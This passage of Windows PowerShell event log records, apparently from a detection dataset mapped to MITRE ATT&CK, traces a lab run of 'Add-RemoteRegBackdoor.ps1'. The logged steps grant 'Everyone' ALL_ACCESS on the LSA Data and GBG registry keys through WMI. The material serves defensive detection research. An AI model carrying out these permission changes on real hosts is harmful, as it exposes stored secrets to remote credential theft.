C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1070,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Data] Backdooring started for key"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1070,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data] Backdooring started for key\"", ""}]}}"
96,68930,2021-12-09 19:54:03.5195633,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1072,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1072,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Data] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1072,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"", ""}]}}"
97,68931,2021-12-09 19:54:03.5195633,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1074,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1074,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""System.Management.ManagementClass"", ParameterBinding(New-Object): name=""ArgumentList""; value=""win32_Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1074,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\"", ParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\"", ""}]}}"
98,68932,2021-12-09 19:54:03.5195633,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1076,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1076,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Data] Creating the trustee WMI object with user 'Everyone'"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1076,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data] Creating the trustee WMI object with user 'Everyone'\"", ""}]}}"
99,68933,2021-12-09 19:54:03.5195633,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1078,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1078,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""System.Management.ManagementClass"", ParameterBinding(New-Object): name=""ArgumentList""; value=""win32_Trustee"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1078,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\"", ParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\"", ""}]}}"
100,68934,2021-12-09 19:54:03.5351877,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1080,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1080,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Data] Applying Trustee to new Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1080,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data] Applying Trustee to new Ace\"", ""}]}}"
101,68935,2021-12-09 19:54:03.5406314,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1082,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1082,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Data] Calling SetSecurityDescriptor on the key with the newly created Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1082,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data] Calling SetSecurityDescriptor on the key with the newly created Ace\"", ""}]}}"
102,68936,2021-12-09 19:54:03.5406314,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1084,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1084,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Data] Backdooring completed for key"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1084,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data] Backdooring completed for key\"", ""}]}}"
103,68937,2021-12-09 19:54:03.5406314,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1086,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1086,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Backdooring started for key"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1086,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Backdooring started for key\"", ""}]}}"
104,68938,2021-12-09 19:54:03.5562642,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1088,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1088,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1088,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"", ""}]}}"
105,68939,2021-12-09 19:54:03.5562642,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1090,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1090,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""System.Management.ManagementClass"", ParameterBinding(New-Object): name=""ArgumentList""; value=""win32_Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense 